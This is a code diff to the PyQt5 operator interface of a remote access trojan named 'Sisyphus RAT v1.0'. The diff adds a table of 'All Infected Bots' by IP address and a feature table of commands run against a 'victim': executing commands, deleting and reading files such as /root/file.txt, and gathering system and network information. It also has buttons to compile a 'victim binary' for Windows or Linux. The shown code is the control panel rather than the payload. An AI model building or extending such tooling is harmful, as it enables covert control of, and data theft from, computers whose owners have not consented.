@@ -1,6 +1,6 @@
 ## regular imports
 
-import sys, os, socket
+import sys, os, socket, qdarkstyle
 
 ## PyQt5 imports
 
@@ -8,6 +8,7 @@ from PyQt5.QtWidgets import *
 from PyQt5.QtCore import *
 from PyQt5 import QtCore
 from PyQt5 import QtGui
+from PyQt5.QtGui import *
 
 class WindowManager(QWidget):
     def __init__(self):
@@ -15,8 +16,13 @@ class WindowManager(QWidget):
 
         ## Window information
         self.title = "Sisyphus RAT v1.0"
-        self.width = 1500
-        self.height = 500
+        self.width = 600
+        self.height = 1000
+
+        ## set target information
+        self.enterConnection = QLabel()
+        self.newConnection = QLineEdit()
+        self.targetInput = QLineEdit()
 
         ## run features and display output
         self.promptLabel = QLabel()
@@ -33,12 +39,15 @@ class WindowManager(QWidget):
         self.linux.toggled.connect(self.compileLinux)
         self.windows.toggled.connect(self.compileWindows)
 
+        ## add new connection button
+        self.newConnectionButton = QPushButton("Add Connection")
+        self.newConnectionButton.clicked.connect(self.addConnection)
+
         ## labels for features and usage
-        self.runCommand = QLabel()
-        self.deleteFile = QLabel()
-        self.systemInfo = QLabel()
-        self.networkingInfo = QLabel()
-        self.readFile = QLabel()
+        self.featureExamples = QLabel()
+        self.botsDescription = QLabel()
+
+        self.botsCounter = 0
 
         self.initUi()
 
@@ -47,29 +56,63 @@ class WindowManager(QWidget):
         self.setGeometry(10, 10, self.width, self.height)
 
         ## set label text contents
-        self.promptLabel.setText("Run a feature ex: run_command(ls)")
+        self.enterConnection.setText("Enter a new connection")
+        self.targetInput.setPlaceholderText("Target IP Address...")
+        self.newConnection.setPlaceholderText("IP of new connection...")
+        self.botsDescription.setText("All Infected Bots\n")
+        self.botsDescription.setFont(QFont('Arial', 16))
+        self.featureExamples.setText("Features and Examples\n")
+        self.featureExamples.setFont(QFont('Arial', 16))
+        self.promptLabel.setText("Feature and Aruguments...")
         self.compileLabel.setText("Compile victim binary for either windows or linux, output to pwd")
-        self.runCommand.setText("Run a command on the victim, ex: execute(ls)")
-        self.deleteFile.setText("Delete a file on the victim, ex: delete(/root/file.txt)")
-        self.systemInfo.setText("Display basic system info on a victim, ex: system_info()")
-        self.networkingInfo.setText("Display networking info on a victim, ex: networking_info()")
-        self.readFile.setText("Read a file contents on the victim, ex: read(/root/file.txt)\n")
 
+        ## bots table
+        self.botsTable = QTableWidget()
+        self.botsTable.setColumnCount(2)
+        self.botsTable.setRowCount(100)
+        self.description = ["IP Address", "STATUS"]
+        self.botsTable.setHorizontalHeaderLabels(self.description)
+
+        ## features table
+        self.featureTable = QTableWidget()
+        self.featureTable.setRowCount(5)
+        self.featureTable.setColumnCount(2)
+        self.features = ["COMMAND", "EXAMPLE"]
+        self.featureTable.setHorizontalHeaderLabels(self.features)
+        self.featureTable.setItem(0, 0, QTableWidgetItem("Run a command on the victim"))
+        self.featureTable.setItem(0, 1, QTableWidgetItem("execute(ls)"))
+        self.featureTable.setItem(1, 0, QTableWidgetItem("Delete a file in the victim"))
+        self.featureTable.setItem(1, 1, QTableWidgetItem("delete(/root/file.txt"))
+        self.featureTable.setItem(2, 0, QTableWidgetItem("Display victim system info"))
+        self.featureTable.setItem(2, 1, QTableWidgetItem("system_info()"))
+        self.featureTable.setItem(3, 0, QTableWidgetItem("Display victim networking info"))
+        self.featureTable.setItem(3, 1, QTableWidgetItem("networking_info()"))
+        self.featureTable.setItem(4, 0, QTableWidgetItem("Read a file on the victim"))
+        self.featureTable.setItem(4, 1, QTableWidgetItem("read(/root/file.txt)"))
+        self.featureTable.resizeColumnsToContents()
+        self.featureTable.resizeRowsToContents()
+
+        ## user enters command and argument
         self.command_prompt.setMaxLength(100)
         self.command_prompt.setPlaceholderText("Enter feature with arguments and target")
 
+        self.newConnection.setMaxLength(30)
+
+        ## output console dimensions
         self.console.setMaximumHeight(200)
-        self.console.setMaximumWidth(500)
+        self.console.setMaximumWidth(700)
         
         self.command_prompt.setMaximumWidth(500)
 
         ## add all the widgets
         layout = QGridLayout()
-        layout.addWidget(self.runCommand)
-        layout.addWidget(self.deleteFile)
-        layout.addWidget(self.systemInfo)
-        layout.addWidget(self.networkingInfo)
-        layout.addWidget(self.readFile)
+        layout.addWidget(self.enterConnection)
+        layout.addWidget(self.newConnection)
+        layout.addWidget(self.newConnectionButton)
+        layout.addWidget(self.botsDescription)
+        layout.addWidget(self.botsTable)
+        layout.addWidget(self.featureExamples)
+        layout.addWidget(self.featureTable)
         layout.addWidget(self.command_prompt)
         layout.addWidget(self.console)
         layout.addWidget(self.execute)
@@ -94,6 +137,10 @@ class WindowManager(QWidget):
         results = results.decode("utf8")
         self.console.setText(results)
 
+    def addConnection(self):
+        self.botsTable.setItem(self.botsCounter, 0, QTableWidgetItem(str(self.newConnection.text())))
+        self.botsCounter += 1
+
     def compileLinux(self):
         print("Compiling for linux")
 
@@ -102,5 +149,6 @@ class WindowManager(QWidget):
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
+    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
     ex = WindowManager()
     sys.exit(app.exec_())
